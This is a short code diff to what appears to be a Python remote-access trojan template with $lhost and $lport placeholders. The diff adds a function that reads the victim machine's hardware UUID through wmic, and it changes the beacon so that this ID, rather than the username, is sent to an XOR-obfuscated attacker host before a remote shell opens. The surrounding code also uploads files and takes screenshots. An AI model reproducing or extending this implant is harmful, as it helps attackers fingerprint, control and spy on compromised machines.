@@ -702,7 +702,9 @@ def upload_file(file_name):
         f = open(file_name, 'rb')
         s.send(f.read())
         f.close()
-
+def gethwid():
+    hwid = str(subprocess.check_output('wmic csproduct get uuid',shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)).split('\\r\\n')[1].strip('\\r').strip()
+    return hwid
 
 def screenshot():
     myScreenshot = pyautogui.screenshot()
@@ -734,8 +736,7 @@ def connection():
             port = xor_strings($lport, $portkey).decode('utf8')
             host = xor_strings($lhost, $hostkey).decode('utf8')
             s.connect((host,int(port)))
-
-            s.send('$key'.encode()+":".encode()+getpass.getuser().encode())
+            s.send('$key'.encode()+":".encode()+gethwid().encode())
 
             shell()
             s.close()
